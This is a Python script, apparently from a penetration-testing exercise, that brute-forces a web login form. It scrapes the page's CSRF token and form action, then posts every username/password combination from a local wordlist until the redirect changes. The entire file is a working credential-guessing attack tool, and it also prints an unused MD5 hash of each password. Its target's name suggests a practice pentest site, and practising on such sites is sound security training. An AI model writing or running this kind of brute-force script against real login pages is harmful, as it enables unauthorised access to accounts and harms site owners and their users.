import requests
import hashlib
from bs4 import BeautifulSoup

url = 'https://progpentest.sivadira.com'
login_action_url = ''
csrf_token = ''
session = None
wordlist = []

def main():
    global login_action_url, csrf_token, session
    
    read_file()
    session = requests.Session()

    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    # print(response.text)
    # print(soup.prettify())
    
    csrf_token = soup.find('input', {'name' : '_token'})['value']
    print(csrf_token)

    login_action_url = soup.find('form')['action']
    print(login_action_url)

    username, password = bruteforce()

    if username != None:
        print("{} and {} combination is valid".format(username, password))
    else:
        print("Invalid Login")

def bruteforce():
    for username in wordlist:
        for password in wordlist:
            payload = {
                '_token' : csrf_token,
                'username': username,
                'password': password,
            }

            hashed = hashlib.md5(password.encode()).hexdigest()
            print(hashed)

            response = session.post(url + login_action_url, data=payload)

            if response.url != url + '/login.php':
                return username, password
    
    return None, None

def read_file():
    file = open('wordlist.txt', 'r')
    for f in file:
        wordlist.append(f.strip())
    file.close()


if __name__ == "__main__":
    main()